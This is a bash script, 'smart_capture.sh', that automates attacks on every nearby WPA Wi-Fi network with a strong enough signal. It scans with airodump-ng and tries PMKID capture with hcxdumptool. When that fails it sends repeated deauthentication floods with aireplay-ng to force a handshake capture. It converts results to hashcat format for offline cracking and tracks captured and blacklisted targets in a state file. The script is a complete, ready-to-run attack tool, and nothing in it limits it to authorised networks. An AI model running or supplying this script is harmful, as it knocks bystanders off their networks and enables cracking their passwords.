#!/bin/bash
# smart_capture.sh - Intelligent automated capture (learns and adapts)

SESSION="smart"
LOG_FILE=~/logs/smart_capture_$(date +%Y%m%d_%H%M%S).log
STATE_FILE=~/captures/.smart_state.json

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Initialize state file
if [ ! -f "$STATE_FILE" ]; then
    echo '{"captured":[],"attempted":[],"blacklist":[]}' > "$STATE_FILE"
fi

log "=== Smart Capture Started ==="

# Scan for targets
log "Scanning for targets..."
SCAN_FILE=/tmp/smart_scan_$(date +%s)
sudo timeout 60 airodump-ng wlan1mon -w "$SCAN_FILE" --output-format csv

# Parse and prioritize targets
log "Analyzing targets..."

# Extract WPA networks with good signal
TARGETS=$(tail -n +2 "${SCAN_FILE}-01.csv" 2>/dev/null | \
    grep -v "Station MAC" | \
    grep "WPA" | \
    awk -F',' '{
        if($1 != "" && $4 != "") {
            signal=$4;
            bssid=$1;
            channel=$6;
            essid=$14;
            gsub(/ /, "", essid);
            if(signal >= -70) print signal "\t" bssid "\t" channel "\t" essid
        }
    }' | sort -rn)

if [ -z "$TARGETS" ]; then
    log "No suitable targets found"
    exit 1
fi

log "Found $(echo "$TARGETS" | wc -l) potential targets"

# Process each target
echo "$TARGETS" | while IFS=$'\t' read -r signal bssid channel essid; do
    
    # Check if already captured
    if grep -q "\"$bssid\"" "$STATE_FILE" 2>/dev/null; then
        log "Skipping $bssid ($essid) - already captured"
        continue
    fi
    
    # Check if blacklisted (failed multiple times)
    if jq -e ".blacklist[] | select(. == \"$bssid\")" "$STATE_FILE" &>/dev/null; then
        log "Skipping $bssid ($essid) - blacklisted"
        continue
    fi
    
    log "Targeting: $essid ($bssid) on channel $channel [${signal}dBm]"
    
    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    CAPTURE_FILE=~/captures/wpa/${essid}_${bssid//:/_}_${TIMESTAMP}
    
    # Try PMKID first (fast, no deauth needed)
    log "Attempting PMKID capture..."
    sudo timeout 120 hcxdumptool -i wlan1mon -o /tmp/pmkid_${TIMESTAMP}.pcapng \
        --enable_status=1 --filterlist_ap=<(echo "$bssid") --filtermode=2
    
    if [ -f /tmp/pmkid_${TIMESTAMP}.pcapng ]; then
        hcxpcapngtool -o "${CAPTURE_FILE}.hc22000" /tmp/pmkid_${TIMESTAMP}.pcapng 2>/dev/null
        
        if [ -s "${CAPTURE_FILE}.hc22000" ] && grep -q "WPA\*02" "${CAPTURE_FILE}.hc22000"; then
            log "SUCCESS: PMKID captured for $essid"
            
            # Mark as captured
            jq ".captured += [\"$bssid\"]" "$STATE_FILE" > /tmp/state.tmp && mv /tmp/state.tmp "$STATE_FILE"
            
            # Move to next target
            continue
        fi
    fi
    
    # PMKID failed, try handshake capture
    log "PMKID failed, attempting handshake capture..."
    
    # Start capture
    sudo airodump-ng -c "$channel" --bssid "$bssid" \
        -w "$CAPTURE_FILE" --output-format pcap \
        wlan1mon &
    AIRODUMP_PID=$!
    
    sleep 5
    
    # Deauth attack
    log "Sending deauth packets..."
    for i in {1..3}; do
        sudo aireplay-ng --deauth 10 -a "$bssid" wlan1mon
        sleep 20
        
        # Check for handshake
        if [ -f "${CAPTURE_FILE}-01.cap" ]; then
            if aircrack-ng "${CAPTURE_FILE}-01.cap" 2>&1 | grep -q "1 handshake"; then
                log "SUCCESS: Handshake captured for $essid"
                
                # Convert for hashcat
                hcxpcapngtool -o "${CAPTURE_FILE}.hc22000" "${CAPTURE_FILE}-01.cap" 2>/dev/null
                
                # Mark as captured
                jq ".captured += [\"$bssid\"]" "$STATE_FILE" > /tmp/state.tmp && mv /tmp/state.tmp "$STATE_FILE"
                
                sudo kill $AIRODUMP_PID 2>/dev/null
                break 2
            fi
        fi
    done
    
    # Clean up
    sudo kill $AIRODUMP_PID 2>/dev/null
    
    # If still no capture, mark as attempted
    if [ ! -f "${CAPTURE_FILE}.hc22000" ] || [ ! -s "${CAPTURE_FILE}.hc22000" ]; then
        log "FAILED: No capture for $essid after 3 attempts"
        
        # Track attempts
        ATTEMPT_COUNT=$(jq ".attempted | map(select(. == \"$bssid\")) | length" "$STATE_FILE")
        
        if [ "$ATTEMPT_COUNT" -ge 2 ]; then
            log "Blacklisting $bssid after multiple failures"
            jq ".blacklist += [\"$bssid\"]" "$STATE_FILE" > /tmp/state.tmp && mv /tmp/state.tmp "$STATE_FILE"
        else
            jq ".attempted += [\"$bssid\"]" "$STATE_FILE" > /tmp/state.tmp && mv /tmp/state.tmp "$STATE_FILE"
        fi
    fi
    
    # Small delay before next target
    sleep 30
done

log "=== Smart Capture Complete ==="

# Generate summary
CAPTURED_COUNT=$(jq '.captured | length' "$STATE_FILE")
log "Total captures: $CAPTURED_COUNT"
log "Report saved to: $LOG_FILE"